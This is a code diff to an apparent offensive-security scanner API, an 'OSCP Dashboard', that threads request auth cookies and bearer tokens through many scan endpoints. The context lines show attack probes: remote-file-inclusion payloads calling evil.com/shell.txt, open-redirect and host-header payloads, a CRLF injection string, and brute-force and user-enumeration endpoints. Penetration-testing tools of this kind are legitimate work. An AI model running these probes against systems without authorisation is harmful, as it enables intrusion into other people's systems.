@@ -10,6 +10,8 @@ from pydantic import BaseModel
 from typing import Optional, List
 import subprocess, asyncio, re, json, uuid, datetime, os, ssl as _ssl_lib, socket as _socket_lib, time as _time, itertools as _itertools
 from urllib.parse import urlparse
+from contextvars import ContextVar
+_AUTH_CTX: ContextVar = ContextVar('auth_req', default=None)
 
 app = FastAPI(title="OSCP Dashboard API")
 
@@ -37,13 +39,14 @@ class ScanRequest(BaseModel):
     wordlist: Optional[List[str]] = None    # custom paths for gobuster/ffuf
 
 def _make_req_headers(req=None):
-    """Merge browser headers with optional auth from ScanRequest."""
+    """Merge browser headers with optional auth from ScanRequest or context."""
     h = dict(_BROWSER_HEADERS)
-    if req:
-        if getattr(req, 'auth_cookie', None):
-            h['Cookie'] = req.auth_cookie
-        if getattr(req, 'auth_bearer', None):
-            h['Authorization'] = f'Bearer {req.auth_bearer}'
+    auth = req or _AUTH_CTX.get()
+    if auth:
+        if getattr(auth, 'auth_cookie', None):
+            h['Cookie'] = auth.auth_cookie
+        if getattr(auth, 'auth_bearer', None):
+            h['Authorization'] = f'Bearer {auth.auth_bearer}'
     return h
 
 SCAN_HISTORY = []
@@ -443,6 +446,7 @@ def _path_is_real(base_url: str, path: str) -> bool:
 
 @app.post("/api/scan/nikto")
 async def scan_nikto(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = await _nikto_scan(req.target)
     scan_id = str(uuid.uuid4())
     save_scan(scan_id,"nikto",req.target,{"output":str(findings)})
@@ -450,6 +454,7 @@ async def scan_nikto(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/nikto_OLD_UNUSED")
 async def scan_nikto_unused(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     out = ""
     is_spa = _detect_spa(req.target)
 
@@ -494,6 +499,7 @@ async def scan_nikto_unused(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/nmap_vuln")
 async def scan_nmap_vuln(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     host = _recon_host(req.target)
     open_ports = await _tcp_scan(host)
     findings = []
@@ -517,6 +523,7 @@ async def scan_nmap_vuln(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/sqlmap")
 async def scan_sqlmap(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = await _sqli_engine(_web_url(req.target))
     out = str(findings) if findings else "No SQL injection found"
     scan_id = str(uuid.uuid4())
@@ -526,6 +533,7 @@ async def scan_sqlmap(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/headers")
 async def scan_headers(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     SECURITY_HEADERS = [
         ("content-security-policy","Content-Security-Policy","HIGH","CSP prevents XSS attacks","6.1","CWE-79","Cross-Site Scripting","A03:2021"),
         ("strict-transport-security","HSTS","HIGH","Forces HTTPS connections","7.5","CWE-319","Cleartext Transmission","A02:2021"),
@@ -555,6 +563,7 @@ async def scan_headers(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/cookies")
 async def scan_cookies(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []
     cookies = []
     try:
@@ -581,6 +590,7 @@ async def scan_cookies(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/ssl")
 async def scan_ssl(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     host = _recon_host(req.target)
     loop = asyncio.get_event_loop()
     findings = await loop.run_in_executor(None, _ssl_analyze, host)
@@ -592,6 +602,7 @@ async def scan_ssl(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/xss")
 async def scan_xss(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []
     raw_lines = []
     base = req.target.rstrip("/")
@@ -673,6 +684,7 @@ async def scan_xss(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/cms")
 async def scan_cms(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     loop = asyncio.get_event_loop()
     detected = await loop.run_in_executor(None, _detect_tech, _web_url(req.target))
     findings = []
@@ -688,6 +700,7 @@ async def scan_cms(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/dirb")
 async def scan_dirb(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     items = await _python_fuzz(req.target)
     found = [f"{_web_url(req.target).rstrip('/')}{item['path']}" for item in items]
     findings = [{"detail":f"Accessible path: {item['path']} (HTTP {item['status']})","severity":"MEDIUM" if item["status"]==403 else "LOW","cvss":"5.3" if item["status"]==403 else "3.1","cve":"N/A","cwe":"CWE-538","cwe_name":"File Exposure","owasp":"A01:2021","remediation":"Restrict access to sensitive directories"} for item in items]
@@ -826,8 +839,12 @@ async def csrf_scan(req: ScanRequest, user=Depends(verify_token)):
 #  MISSING WEB APP SCAN ENDPOINTS
 # ══════════════════════════════════════════════════════════════
 
-def _http_get(url, timeout=10, headers=None):
+def _http_get(url, timeout=10, headers=None, req=None):
     h = dict(_BROWSER_HEADERS)
+    auth = req or _AUTH_CTX.get()
+    if auth:
+        if getattr(auth,'auth_cookie',None): h['Cookie'] = auth.auth_cookie
+        if getattr(auth,'auth_bearer',None): h['Authorization'] = f'Bearer {auth.auth_bearer}'
     if headers: h.update(headers)
     try: return _req_lib.get(url,timeout=timeout,verify=False,headers=h,allow_redirects=True)
     except: return None
@@ -1259,6 +1276,7 @@ def _cyclic_pattern(size: int) -> str:
 
 @app.post("/api/scan/wafw00f")
 async def scan_wafw00f(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     loop = asyncio.get_event_loop()
     waf = await loop.run_in_executor(None, _detect_waf, _web_url(req.target))
     out = f"WAF detected: {waf}" if waf else "No WAF detected"
@@ -1268,6 +1286,7 @@ async def scan_wafw00f(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/whatweb")
 async def scan_whatweb(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     loop = asyncio.get_event_loop()
     detected = await loop.run_in_executor(None, _detect_tech, _web_url(req.target))
     out = ", ".join(detected) if detected else "No technologies detected"
@@ -1276,6 +1295,7 @@ async def scan_whatweb(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/nmap")
 async def scan_nmap(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     host = _recon_host(req.target)
     ports = await _tcp_scan(host)
     out = "\n".join(f"{p['port']}/tcp open {p['service']} {p['version']}" for p in ports)
@@ -1284,6 +1304,7 @@ async def scan_nmap(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/cors")
 async def scan_cors(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; vulnerable = False
     try:
         r = _req_lib.get(_web_url(req.target),timeout=15,verify=False,headers={**_BROWSER_HEADERS,"Origin":"https://evil.com"},allow_redirects=True)
@@ -1302,6 +1323,7 @@ async def scan_cors(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/gobuster")
 async def scan_gobuster(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     items = await _python_fuzz(req.target, custom_paths=req.wordlist, extra_headers=_make_req_headers(req) if (req.auth_cookie or req.auth_bearer) else None)
     discovered = [item["path"] for item in items if item["status"]==200]
     out = "\n".join(f"/{item['status']} {item['path']}" for item in items)
@@ -1310,6 +1332,7 @@ async def scan_gobuster(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/subdomains")
 async def scan_subdomains(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     host = _recon_host(req.target)
     subdomains = await _enum_subdomains(host)
     out = "\n".join(subdomains)
@@ -1318,6 +1341,7 @@ async def scan_subdomains(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/dns")
 async def scan_dns(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     host = _recon_host(req.target)
     loop = asyncio.get_event_loop()
     recs = await loop.run_in_executor(None, _dns_enum_records, host)
@@ -1329,6 +1353,7 @@ async def scan_dns(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/ffuf")
 async def scan_ffuf(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     items = await _python_fuzz(req.target, custom_paths=req.wordlist, extra_headers=_make_req_headers(req) if (req.auth_cookie or req.auth_bearer) else None)
     discovered = [item["path"] for item in items]
     out = "\n".join(f"[{item['status']}] {item['path']} [{item['size']} bytes]" for item in items)
@@ -1337,6 +1362,7 @@ async def scan_ffuf(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/rfi")
 async def scan_rfi(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; vulnerable = False
     test_payloads = ["?page=http://evil.com/shell.txt","?file=http://evil.com/","?include=http://evil.com/","?url=http://evil.com/"]
     for p in test_payloads[:2]:
@@ -1349,6 +1375,7 @@ async def scan_rfi(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/deserial")
 async def scan_deserial(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     import base64 as _b64
     findings = []; vulnerable = False
     base = _web_url(req.target).rstrip("/")
@@ -1391,6 +1418,7 @@ async def scan_deserial(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/protopollution")
 async def scan_protopollution(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; vulnerable = False
     base = _web_url(req.target).rstrip("/")
     marker = f"pptest{uuid.uuid4().hex[:6]}"
@@ -1436,6 +1464,7 @@ async def scan_protopollution(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/typejuggling")
 async def scan_typejuggling(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; vulnerable = False
     base = _web_url(req.target).rstrip("/")
     # PHP magic hashes — these strings == 0 in loose comparison (==) with 0 or other magic hashes
@@ -1483,6 +1512,7 @@ async def scan_typejuggling(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/jwt")
 async def scan_jwt(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     import base64 as _b64, hmac as _hmac, hashlib as _hashlib, json as _json
     findings = []; vulnerable = False
     base = _web_url(req.target).rstrip("/")
@@ -1556,6 +1586,7 @@ async def scan_jwt(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/graphql")
 async def scan_graphql(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; vulnerable = False
     base = _web_url(req.target).rstrip("/")
     gql_paths = ["/graphql","/api/graphql","/graphiql","/playground","/gql","/query",
@@ -1605,6 +1636,7 @@ async def scan_graphql(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/smuggling")
 async def scan_smuggling(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []
     # Send TE.CL ambiguous request and look for server confusion (501/400 NOT present = server accepts both headers)
     # Also check if server responds with different status when TE conflicts
@@ -1622,6 +1654,7 @@ async def scan_smuggling(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/responsesplitting")
 async def scan_responsesplitting(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; vulnerable = False
     test = req.target + "?q=%0d%0aSet-Cookie:injected=1"
     r = _http_get(test, timeout=10)
@@ -1633,6 +1666,7 @@ async def scan_responsesplitting(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/sessionfixation")
 async def scan_sessionfixation(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; vulnerable = False
     r = _http_get(req.target, timeout=10)
     if r:
@@ -1647,6 +1681,7 @@ async def scan_sessionfixation(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/openredirect")
 async def scan_openredirect(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; vulnerable = False
     payloads = ["?url=https://evil.com","?redirect=https://evil.com","?next=https://evil.com","?return=https://evil.com","?to=https://evil.com"]
     for p in payloads:
@@ -1664,6 +1699,7 @@ async def scan_openredirect(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/sensitivefiles")
 async def scan_sensitivefiles(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; base = req.target.rstrip("/")
     is_spa = _detect_spa(req.target)
     baseline_size = None
@@ -1706,6 +1742,7 @@ async def scan_sensitivefiles(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/hydra")
 async def scan_hydra(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; vulnerable = False
     if _is_external(req.target):
         scan_id = str(uuid.uuid4()); save_scan(scan_id,"hydra",req.target,{"output":"skipped-external"})
@@ -1748,6 +1785,7 @@ async def scan_hydra(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/ssrf")
 async def scan_ssrf(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; vulnerable = False
     base = _web_url(req.target).rstrip("/")
     # Top SSRF parameter names (most commonly exploited)
@@ -1803,6 +1841,7 @@ async def scan_ssrf(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/xxe")
 async def scan_xxe(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; vulnerable = False
     url = _web_url(req.target)
     headers_xml  = {"Content-Type":"application/xml","User-Agent":"Mozilla/5.0","Accept":"application/xml,text/xml,*/*"}
@@ -1862,6 +1901,7 @@ async def scan_xxe(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/clickjacking")
 async def scan_clickjacking(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; vulnerable = False
     url = _web_url(req.target)
     try:
@@ -1907,6 +1947,7 @@ async def scan_clickjacking(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/verbtamper")
 async def scan_verbtamper(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; vulnerable = False
     try:
         r = _req_lib.options(_web_url(req.target),timeout=15,verify=False,headers=_BROWSER_HEADERS)
@@ -1921,6 +1962,7 @@ async def scan_verbtamper(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/pollution")
 async def scan_pollution(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; vulnerable = False
     try:
         r1 = _req_lib.get(_web_url(req.target)+"?id=1",timeout=15,verify=False,headers=_BROWSER_HEADERS)
@@ -1935,6 +1977,7 @@ async def scan_pollution(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/idor")
 async def scan_idor(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; vulnerable = False
     base = req.target.rstrip("/")
     baseline_size = None
@@ -1976,6 +2019,7 @@ async def scan_idor(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/ssti")
 async def scan_ssti(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; vulnerable = False
     base_url = _web_url(req.target).rstrip("/")
     # Fetch baseline to filter out numbers already present on the page
@@ -2009,6 +2053,7 @@ async def scan_ssti(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/fileupload")
 async def scan_fileupload(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; vulnerable = False
     base = req.target.rstrip("/")
     upload_paths = ["/upload","/file-upload","/upload.php","/fileupload","/api/upload","/admin/upload","/media/upload"]
@@ -2041,6 +2086,7 @@ async def scan_fileupload(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/dataexfil")
 async def scan_dataexfil(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []
     r = _http_get(_web_url(req.target), timeout=15)
     if r:
@@ -2056,6 +2102,7 @@ async def scan_dataexfil(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/racecondition")
 async def scan_racecondition(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; responses = []
     try:
         import concurrent.futures
@@ -2119,6 +2166,7 @@ def _smb_null_session(host: str, port: int = 445) -> bool:
 
 @app.post("/api/scan/smb")
 async def scan_smb(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     host = _recon_host(req.target)
     findings = []; smb_open = False; smb_port = None
     for port in [445, 139]:
@@ -2144,6 +2192,7 @@ async def scan_smb(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/ftp")
 async def scan_ftp(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     host = _recon_host(req.target)
     findings = []; ftp_open = False; banner = ""; anon_ok = False; files = []
     loop = asyncio.get_event_loop()
@@ -2191,6 +2240,7 @@ _SMTP_USERS = ["root","admin","administrator","postmaster","info","test","user",
 
 @app.post("/api/scan/smtp")
 async def scan_smtp(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     host = _recon_host(req.target)
     findings = []; smtp_open = False; banner = ""; valid_users = []; open_relay = False
     loop = asyncio.get_event_loop()
@@ -2294,6 +2344,7 @@ def _snmp_scan(host: str) -> dict:
 
 @app.post("/api/scan/snmp")
 async def scan_snmp(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     host = _recon_host(req.target)
     loop = asyncio.get_event_loop()
     snmp = await loop.run_in_executor(None, _snmp_scan, host)
@@ -2313,6 +2364,7 @@ async def scan_snmp(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/exploitsearch")
 async def scan_exploitsearch(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     query = req.target.strip()
     findings = []; exploits = []; cves = []
     loop = asyncio.get_event_loop()
@@ -3480,6 +3532,7 @@ async def exploit_shell_stop(lid: str, user=Depends(verify_token)):
 
 @app.post("/api/scan/nosql")
 async def scan_nosql(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; base = _web_url(req.target)
     login_paths = ["/login", "/api/login", "/api/users", "/api/auth", "/signin", "/api/signin"]
     payloads_get = [
@@ -3526,6 +3579,7 @@ async def scan_nosql(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/oauth")
 async def scan_oauth(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; base = _web_url(req.target)
     oauth_paths = ["/.well-known/openid-configuration", "/.well-known/oauth-authorization-server",
                    "/oauth/authorize", "/oauth/token", "/api/oauth", "/connect/authorize",
@@ -3566,6 +3620,7 @@ async def scan_oauth(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/hostheader")
 async def scan_hostheader(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; base = _web_url(req.target)
     parsed = urlparse(base); real_host = parsed.netloc or parsed.path; evil_host = "evil-attacker.com"
     host_tests = [
@@ -3601,6 +3656,7 @@ async def scan_hostheader(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/websocket")
 async def scan_websocket(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; base = _web_url(req.target)
     parsed = urlparse(base); host = parsed.netloc or parsed.path
     ws_paths = ["/ws", "/websocket", "/socket.io", "/socket", "/chat", "/live", "/api/ws", "/api/socket", "/realtime"]
@@ -3640,6 +3696,7 @@ async def scan_websocket(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/takeover")
 async def scan_takeover(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     import dns.resolver, dns.exception
     findings = []; base = _web_url(req.target)
     parsed = urlparse(base); apex_domain = parsed.hostname or ""
@@ -3691,6 +3748,7 @@ async def scan_takeover(req: ScanRequest, user=Depends(verify_token)):
 
 @app.post("/api/scan/otp")
 async def scan_otp(req: ScanRequest, user=Depends(verify_token)):
+    _AUTH_CTX.set(req)
     findings = []; base = _web_url(req.target)
     otp_paths = ["/otp", "/verify", "/2fa", "/mfa", "/totp", "/api/otp", "/api/verify",
                  "/api/2fa", "/api/mfa", "/auth/otp", "/auth/2fa", "/verify-otp", "/confirm"]
